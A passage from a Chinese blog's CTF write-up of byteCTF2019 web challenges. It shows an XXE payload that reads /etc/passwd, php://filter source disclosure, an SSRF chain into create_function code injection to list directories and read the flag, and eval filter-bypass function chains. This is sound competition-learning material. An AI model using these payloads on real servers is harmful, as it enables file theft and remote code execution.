@@ -1,0 +1,891 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,web,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="九月初的比赛，当时划水了一天半，第二天后面才做了一道题">
+<meta name="keywords" content="ctf,web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="byteCTF2019 web 复现">
+<meta property="og:url" content="http://yoursite.com/2020/01/18/byteCTF2019-web-wp/index.html">
+<meta property="og:site_name" content="k0t0r1の家">
+<meta property="og:description" content="九月初的比赛，当时划水了一天半，第二天后面才做了一道题">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/9fa73f6105449ce0082810380c31e07c.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/a5c58e5437d4299a0f3404f50e092094.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/284626ee56b4c7db3fbdce20f6c9397a.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/afb8c82dc59a5e8d5bc90e71d888d20d.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/52461e94e45baee6a6705d5c90b8378d.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/41160c5f97734ce11e5c4cb3c54c1aff.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/870d866a88c48128cb21a129be90378f.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/a3c21724bff8c120644db4764adc733d.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/728d786d4359da9c62320a187df67db4.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/83cc4169b25ab086de2b2f2055c62b72.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/06d0360200ce033d21556aafea228a6e.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/446816224e70efd3e112c96c0c825ed5.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/1ce25df4c58739924649716b8e51de81.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/f0b193f8cf526fbe4093559008e2f7f0.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/cd055f3dd16af72b99bbb42b1708a92f.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/e6bc880bdbf6c588b1eb913dd40c0242.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/753a0667c74005c21b7dfc3df7b72150.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/25e34ee86507f1c45fe390137e899312.png">
+<meta property="og:updated_time" content="2020-03-18T14:22:59.832Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="byteCTF2019 web 复现">
+<meta name="twitter:description" content="九月初的比赛，当时划水了一天半，第二天后面才做了一道题">
+<meta name="twitter:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/9fa73f6105449ce0082810380c31e07c.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/01/18/byteCTF2019-web-wp/">
+
+
+
+
+
+  <title>byteCTF2019 web 复现 | k0t0r1の家</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">k0t0r1の家</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/18/byteCTF2019-web-wp/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="k0t0r1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://shifeng-kaze.cn/blog/head/kotori.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="k0t0r1の家">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">byteCTF2019 web 复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-18T14:54:47+09:00">
+                2020-01-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>九月初的比赛，当时划水了一天半，第二天后面才做了一道题</p>
+<a id="more"></a>
+<h2 id="rss"><a href="#rss" class="headerlink" title="rss"></a>rss</h2><p>这题莫得靶机只能列下知识点</p>
+<p>这题是一个解析RSS的题，限制只支持<code>aliyun.com、qq.com、baidu.com</code>。不过由于php是不检查MIME头的，所以可以使用<code>data://baidu.com/plain;base64,</code>这样去绕过对host的限制，然后后面跟上base64后的RSS文档就行</p>
+<p>没用过RSS，但看到RSS的标准文档后，这东西是一种xml，也就是说有可能存在XXE</p>
+<p><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/9fa73f6105449ce0082810380c31e07c.png" alt=""></p>
+<p>于是向头部添加一个内部实体</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;rss version=&quot;2.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;channel&gt;</span><br><span class="line">  &lt;title&gt;菜鸟教程首页&lt;/title&gt;</span><br><span class="line">  &lt;link&gt;http://www.runoob.com&lt;/link&gt;</span><br><span class="line">  &lt;description&gt;免费编程教程&lt;/description&gt;</span><br><span class="line">  &lt;item&gt;</span><br><span class="line">    &lt;title&gt;RSS 教程&lt;/title&gt;</span><br><span class="line">    &lt;link&gt;http://www.runoob.com/rss&lt;/link&gt;</span><br><span class="line">    &lt;description&gt;菜鸟教程 Rss 教程&lt;/description&gt;</span><br><span class="line">  &lt;/item&gt;</span><br><span class="line">  &lt;item&gt;</span><br><span class="line">    &lt;title&gt;XML 教程&lt;/title&gt;</span><br><span class="line">    &lt;link&gt;http://www.runoob.com/xml&lt;/link&gt;</span><br><span class="line">    &lt;description&gt;菜鸟教程 XML 教程&lt;/description&gt;</span><br><span class="line">  &lt;/item&gt;</span><br><span class="line">&lt;/channel&gt;</span><br><span class="line"></span><br><span class="line">&lt;/rss&gt;</span><br></pre></td></tr></table></figure>
+<p>base64后提交，成功读到<code>/etc/passwd</code></p>
+<p>接着用伪协议去读一下源码</p>
+<p><code>php://filter/read=convert.base64-encode/resource=index.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;display_errors&apos;,0);</span><br><span class="line">ini_set(&apos;display_startup_erros&apos;,1);</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">require_once(&apos;routes.php&apos;);</span><br><span class="line"></span><br><span class="line">function __autoload($class_name)&#123;</span><br><span class="line">    if(file_exists(&apos;./classes/&apos;.$class_name.&apos;.php&apos;)) &#123;</span><br><span class="line">        require_once &apos;./classes/&apos;.$class_name.&apos;.php&apos;;</span><br><span class="line">    &#125; else if(file_exists(&apos;./controllers/&apos;.$class_name.&apos;.php&apos;)) &#123;</span><br><span class="line">        require_once &apos;./controllers/&apos;.$class_name.&apos;.php&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>index.php</code>中引入了<code>routes.php</code>，同时有classes和controllers这两个目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">Route::set(&apos;index.php&apos;,function()&#123;</span><br><span class="line">    Index::createView(&apos;Index&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(&apos;index&apos;,function()&#123;</span><br><span class="line">    Index::createView(&apos;Index&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(&apos;fetch&apos;,function()&#123;</span><br><span class="line">    if(isset($_REQUEST[&apos;rss_url&apos;]))&#123;</span><br><span class="line">        Fetch::handleUrl($_REQUEST[&apos;rss_url&apos;]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(&apos;rss_in_order&apos;,function()&#123;</span><br><span class="line">    if(!isset($_REQUEST[&apos;rss_url&apos;]) &amp;&amp; !isset($_REQUEST[&apos;order&apos;]))&#123;</span><br><span class="line">        Admin::createView(&apos;Admin&apos;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">      if($_SERVER[&apos;REMOTE_ADDR&apos;] == &apos;127.0.0.1&apos; || $_SERVER[&apos;REMOTE_ADDR&apos;] == &apos;::1&apos;)&#123;</span><br><span class="line">        Admin::sort($_REQUEST[&apos;rss_url&apos;],$_REQUEST[&apos;order&apos;]);</span><br><span class="line">      &#125;else&#123;</span><br><span class="line">       echo &quot;;(&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p><code>route.php</code>中可以看到有一个接收rss_url和order参数的控制器admin，但需要本地访问，也就是要ssrf</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Admin extends Controller&#123;</span><br><span class="line">    public static function sort($url,$order)&#123;</span><br><span class="line">        $rss=file_get_contents($url);</span><br><span class="line">        $rss=simplexml_load_string($rss,&apos;SimpleXMLElement&apos;, LIBXML_NOENT);</span><br><span class="line">        require_once &apos;./views/Admin.php&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>controllers/admin.php</code>访问url并解析xml</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_SERVER[&apos;REMOTE_ADDR&apos;] != &apos;127.0.0.1&apos;)&#123;</span><br><span class="line">    die(&apos;;(&apos;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php include(&apos;package/header.php&apos;) ?&gt;</span><br><span class="line">&lt;?php if(!$rss) &#123;</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;div class=&quot;rss-head row&quot;&gt;</span><br><span class="line">    &lt;h1&gt;RSS解析失败&lt;/h1&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">        &lt;li&gt;此网站RSS资源可能存在错误无法解析&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;此网站RSS资源可能已经关闭&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;此网站可能禁止PHP获取此内容&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;可能由于来自本站的访问过多导致暂时访问限制Orz&lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    exit;</span><br><span class="line">&#125;;</span><br><span class="line">function rss_sort_date($str)&#123;</span><br><span class="line">    $time=strtotime($str);</span><br><span class="line">    return date(&quot;Y年m月d日 H时i分&quot;,$time);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;div class=&quot;rss-head row&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;col-sm-12 text-center&quot;&gt;</span><br><span class="line">        &lt;h1&gt;&lt;a href=&quot;&lt;?php echo $rss-&gt;channel-&gt;link;?&gt;&quot; target=&quot;_blank&quot;&gt;&lt;?php echo $rss-&gt;channel-&gt;title;?&gt;&lt;/a&gt;&lt;/h1&gt;</span><br><span class="line">        &lt;span style=&quot;font-size: 16px;font-style: italic;width:100%;&quot;&gt;&lt;?php echo $rss-&gt;channel-&gt;link;?&gt;&lt;/span&gt;</span><br><span class="line">        &lt;p&gt;&lt;?php echo $rss-&gt;channel-&gt;description;?&gt;&lt;/p&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line"></span><br><span class="line">            if(isset($rss-&gt;channel-&gt;lastBuildDate)&amp;&amp;$rss-&gt;channel-&gt;lastBuildDate!=&quot;&quot;)&#123;</span><br><span class="line">                echo &quot;&lt;p&gt; 最后更新:&quot;.rss_sort_date($rss-&gt;channel-&gt;lastBuildDate).&quot;&lt;/p&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        ?&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;article-list&quot; style=&quot;padding:10px&quot;&gt;</span><br><span class="line">    &lt;?php </span><br><span class="line">    $data = [];</span><br><span class="line">    foreach($rss-&gt;channel-&gt;item as $item)&#123;</span><br><span class="line">        $data[] = $item;</span><br><span class="line">    &#125;</span><br><span class="line">    usort($data, create_function(&apos;$a, $b&apos;, &apos;return strcmp($a-&gt;&apos;.$order.&apos;,$b-&gt;&apos;.$order.&apos;);&apos;));</span><br><span class="line">    foreach($data as $item)&#123;    </span><br><span class="line">    ?&gt;</span><br><span class="line">        &lt;article class=&quot;article&quot;&gt;</span><br><span class="line">            &lt;h1&gt;&lt;a href=&quot;&lt;?php echo $item-&gt;link;?&gt;&quot; target=&quot;_blank&quot;&gt;&lt;?php echo $item-&gt;title;?&gt;&lt;/a&gt;&lt;/h1&gt;</span><br><span class="line">            &lt;div class=&quot;content&quot;&gt;</span><br><span class="line">                &lt;p&gt;</span><br><span class="line">                    &lt;?php echo $item-&gt;description;?&gt;</span><br><span class="line">                &lt;/p&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div class=&quot;article-info&quot;&gt;</span><br><span class="line">                &lt;i style=&quot;margin:0px 5px&quot;&gt;&lt;/i&gt;&lt;?php echo rss_sort_date($item-&gt;pubDate);?&gt;</span><br><span class="line">                &lt;i style=&quot;margin:0px 5px&quot;&gt;&lt;/i&gt;</span><br><span class="line">                &lt;?php</span><br><span class="line">                    for($i=0;$i&lt;count($item-&gt;category);$i++)&#123;</span><br><span class="line">                        echo $item-&gt;category[$i];</span><br><span class="line">                        if($i+1!=count($item-&gt;category))&#123;</span><br><span class="line">                            echo &quot;,&quot;;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;;</span><br><span class="line">                    if(isset($item-&gt;author)&amp;&amp;$item-&gt;author!=&quot;&quot;)&#123;</span><br><span class="line">                ?&gt;</span><br><span class="line">                        &lt;i class=&quot;fa fa-user&quot; style=&quot;margin:0px 5px&quot;&gt;&lt;/i&gt;</span><br><span class="line">                &lt;?php</span><br><span class="line">                        echo $item-&gt;author;</span><br><span class="line">                    &#125;</span><br><span class="line">                ?&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/article&gt;</span><br><span class="line">    &lt;?php &#125;?&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;text-center&quot;&gt;</span><br><span class="line">    免责声明:本站只提供RSS解析,解析内容与本站无关,版权归来源网站所有</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php include(&apos;package/footer.php&apos;) ?&gt;</span><br></pre></td></tr></table></figure>
+<p><code>views/admin.php</code>主要看到这里</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">   $data = [];</span><br><span class="line">   foreach($rss-&gt;channel-&gt;item as $item)&#123;</span><br><span class="line">       $data[] = $item;</span><br><span class="line">   &#125;</span><br><span class="line">   usort($data, create_function(&apos;$a, $b&apos;, &apos;return strcmp($a-&gt;&apos;.$order.&apos;,$b-&gt;&apos;.$order.&apos;);&apos;));</span><br><span class="line">   foreach($data as $item)&#123;    </span><br><span class="line">   ?&gt;</span><br></pre></td></tr></table></figure>
+<p>这里用了<code>create_function()</code>，同时<code>$order</code>可控，直接RCE就是了</p>
+<p>由于要求<code>127.0.0.1</code>，那就用XXE让服务器访问自己。rss_url填个能用的，order命令注入就完事了</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://127.0.0.1/rss_in_order?rss_url=http://tech.qq.com/photo/dcpic/rss.xml&amp;order=title.var_dump(scandir(&apos;/&apos;))&quot; &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag_eb8ba2eb07702e69963a7d6ab8669134&quot; &gt;</span><br></pre></td></tr></table></figure>
+<h2 id="boring-code"><a href="#boring-code" class="headerlink" title="boring_code"></a>boring_code</h2><p>这题当时是队友分析的，后半天fuzz好久才找到一个能用的payload</p>
+<p>进入题目就是一个猛男对视，F12提示flag在<code>index.php</code>里，同时有个code目录，于是进入code得到源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function is_valid_url($url) &#123;</span><br><span class="line">    if (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        if (preg_match(&apos;/data:\/\//i&apos;, $url)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $_POST[&apos;url&apos;];</span><br><span class="line">if (isset($_POST[&apos;url&apos;]))&#123;</span><br><span class="line">    $url = $_POST[&apos;url&apos;];</span><br><span class="line">    if (is_valid_url($url)) &#123;</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        if (preg_match(&apos;/localhost$/&apos;, $r[&apos;host&apos;])) &#123;</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            if (&apos;;&apos; === preg_replace(&apos;/[a-z]+\((?R)?\)/&apos;, NULL, $code)) &#123;</span><br><span class="line">                if (preg_match(&apos;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&apos;, $code)) &#123;</span><br><span class="line">                    echo &apos;bye~&apos;;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    eval($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;error: host not allowed&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;error: invalid url&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过传入的url去读取其目录下的文件，然后执行文件中的内容。逻辑简单但有四层过滤</p>
+<p>第一、二层限制了只能使用<code>baidu.com</code>作为host的链接，如果没有第一层的话是可以通过<code>data://baidu.com/plain;base64,</code> 这样去绕过的，但被限制了。这里绕过的方式有几种，最简单的就是氪金买域名（队里的大佬tfl），或者通过百度的url跳转（百度一下后去看看链接的href就是了），或者百度云<br>第三层的正则限制了只能左右括号要匹配，同时无参。本来一开始以为是只能像<code>a(b(c()))</code>这种，但后面发现像<code>a(b())c()</code>这样也是可以的<br>第四层就是过滤了一堆函数</p>
+<p>当时整出基本思路就是，先整出一个<code>.</code>，然后用<code>scandir()</code>扫目录，接着用<code>end()</code>取到<code>index.php</code>，最后<code>readfile()</code>输出。问题就是在怎么搞出<code>.</code>，一开始想着构造<code>chr(46)</code>，但弄了很久搞不出46（主要是<code>strlen()</code>被过滤了）</p>
+<p>于是另寻它路，当时不知道怎么fuzz的发现<code>&quot;</code>也是可以让<code>scandir()</code>扫该目录下的文件。然后翻手册中的函数尝试<br><a href="https://www.php.net/manual/zh/indexes.functions.php" target="_blank" rel="noopener">函数和方法列表</a><br>fuzz了很久发现，<code>bzcompress()</code>可以输出各种符号，于是进行多次尝试后，成功得到<code>bzcompress(serialize(array(array(abs()))))</code><br>这个输出的字符串最后一位是<code>&quot;</code>，用<code>strrev()</code>逆序再用<code>ord()</code>获得第一个字符的ascii码，<code>chr()</code>转回来就获得了单个<code>&quot;</code>，当时给出的payload是<br><code>readfile(end(scandir(chr(ord(strrev(bzcompress(serialize(array(array(abs()))))))))));</code><br>但<code>bzcompress()</code>需要扩展，这个题目环境并没有，只能找其它方法了</p>
+<p>接着尝试了一下<code>crypto()</code>，发现这个函数是有挺高的几率尾部是.的。于是一波<br><code>readfile(end(scandir(chr(ord(strrev(crypt(serialize(array()))))))));</code><br>但这时队友提示这里还只是再code目录下，要回到上级目录才能读到</p>
